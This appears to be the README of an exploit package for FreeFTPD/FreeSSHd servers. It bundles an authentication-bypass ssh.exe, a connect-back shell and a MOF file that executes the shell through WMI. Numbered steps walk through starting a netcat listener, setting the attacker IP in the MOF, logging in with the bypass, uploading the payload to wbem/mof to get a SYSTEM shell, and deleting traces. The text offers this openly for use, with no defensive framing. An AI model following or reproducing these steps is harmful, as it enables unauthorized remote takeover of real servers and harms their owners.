This package includes all you need to successfully root any version of FreeFTPD:

* Modified version of ssh.exe (FreeFTPD authentication bypass)
* sftp.exe for connecting to the server
* nullevent.exe connect back shell that is uploaded to the server
* nullevent.mof file which is uploaded to the server to execute the connect back shell
* MSVCR100.dll that is needed by nullevent.exe
* scan logs for your pleasure!

We make use of the STUXNET technique to execute code, So let's go:

1.) Setup a netcat on a host you have, firewall open on the listening port
2.) modify nullevent.mof in an editor (where the ip and port is) according to your netcat config
3.) connect to the FreeSSHD: sftp.exe -S ./ssh.exe <ip/host>
4.) upload (put) nullevent.exe: put nullevent.exe
5.) upload (put) MSVCR100.dll: put MSVCR100.dll
6.) upload (put) nullevent.mof to wbem/mof/nullevent.mof: put nullevent.mof wbem/mof/nullevent.mof
7.) Enjoy your system shell which will blink up on you netcat after 1 minute!!
8.) Cleanup by deleting nullevent.exe located in c:\windows\system32\
8.)  Enjoy!
9.)  Enjoy!
10.) Enjoy!
